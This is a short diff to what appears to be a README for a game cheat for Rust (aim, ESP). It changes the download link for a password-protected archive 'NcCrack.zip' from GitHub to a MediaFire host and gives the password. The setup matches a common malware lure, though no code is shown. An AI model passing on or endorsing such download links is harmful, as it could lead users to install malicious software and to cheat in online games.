@@ -2,7 +2,7 @@
 
 # Download cheat
 
-|[Download](https://github.com/LeakLand-Officiel/Updated-24.01.2023-HACK-RUST-AIM-ESP-VISUAL-MISC/blob/main/NcCrack.zip?raw=true)|
+|[Download](https://www.mediafire.com/file/nljvo2wkslmhdsq/NcCrack.zip/file)|
 |:-------------|
 Passwrod: `2077`
 
